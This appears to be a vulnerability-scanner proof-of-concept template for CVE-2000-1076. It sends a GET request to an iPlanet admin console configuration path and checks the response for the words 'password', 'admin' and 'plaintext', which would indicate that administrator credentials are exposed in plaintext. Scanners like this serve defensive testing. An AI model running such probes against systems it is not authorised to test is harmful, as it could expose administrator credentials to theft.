[info]
author = "ave"
description = "验证目标iPlanet证书管理系统或目录服务器的管理员密码是否以明文形式存储在配置文件中，可通过HTTP访问管理控制台配置页面获取管理员凭证"
id = "POC-AVE-2000-1988"
name = "CVE-2000-1076 PoC"
severity = "critical"
tags = ["ave-2000-1988"]
vuln_id = [
    "CVE-2000-1076",
    "AVE-2000-1988",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/console/config/admin"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "password",
    "admin",
    "plaintext",
]
